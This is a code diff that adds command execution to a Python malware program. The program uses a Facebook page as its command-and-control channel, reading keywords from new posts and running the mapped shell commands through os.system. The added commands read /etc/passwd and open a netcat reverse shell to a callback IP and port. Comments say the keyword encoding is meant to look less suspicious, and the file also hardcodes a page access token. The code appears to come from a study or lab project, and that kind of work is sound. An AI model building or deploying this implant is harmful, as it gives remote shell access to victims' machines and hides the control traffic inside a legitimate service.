@@ -2,11 +2,19 @@
 
 import facebook
 import time
+import os
 
 # This token is good until like June.
 PAGE_LONG_ACCESS_TOKEN = 'EAALq5cEcySYBADHemZAiRUqTHaJwjGZAh1pZCBbm3LnLovTgorO7dDPbXZAUu31l8k8TrYBJPaWivcsihd0PfnHTMgdTvNharhxAtToIUAOX4AdgZCJZCGiLLQKbOl5Gj8fkarbbr7K9FL6XY45e7XbpzbAymN5pU3doc3qmzFgwZDZD'
 # The static account to which the malware connects.
 STATIC_C2_PAGE = 'Hammer_6f5902ac237024bdd0c176cb93063dc4'
+# The IP address and port of the attacker who wants to get command output.
+CALLBACK_IP = '127.0.0.1'
+CALLBACK_PORT = 52017
+COMMAND_KEYWORDS = {
+    'dog': 'cat /etc/passwd',
+    'clam': 'nc -nv {0} {1} -e /bin/bash'.format(CALLBACK_IP, CALLBACK_PORT)
+}
 
 
 def main():
@@ -20,7 +28,8 @@ def run_malware():
     graph = get_graph()
     page_data = get_page_data(graph)
     page_id = page_data['data'][0]['id']
-    wait_for_posts(graph, page_id, lambda post: print(post), verbose=True)
+    post_function = lambda post: run_encoded_command(post, verbose=True)
+    wait_for_posts(graph, page_id, post_function, verbose=True)
 
 
 def test_connectivity():
@@ -34,7 +43,7 @@ def test_connectivity():
     print(posts)
     print(get_any_post(graph, page_id))
     print(get_last_post_data(graph, page_id))
-    
+
 
 def get_graph():
     """Returns the graph based on the access token."""
@@ -96,6 +105,19 @@ def wait_for_posts(graph, page_id, new_post_func, verbose=False):
             last_post_datetime = new_post_datetime
             new_post_func(new_post_data['message'])
         time.sleep(60)
+
+
+def run_encoded_command(post, verbose=False):
+    """Checks the post against the COMMAND_KEYWORDS dict. Executes as a
+    unix command every value for which the key is present in the post.
+    The reason we aren't encoding them some other way is just because we
+    don't want to violate facebook's terms of use. This makes us look
+    less suspicious."""
+    for k in COMMAND_KEYWORDS.keys():
+        if k in post:
+            if verbose:
+                print('Running: {0}'.format(COMMAND_KEYWORDS[k]))
+            os.system(COMMAND_KEYWORDS[k])
 
 
 if __name__ == '__main__':
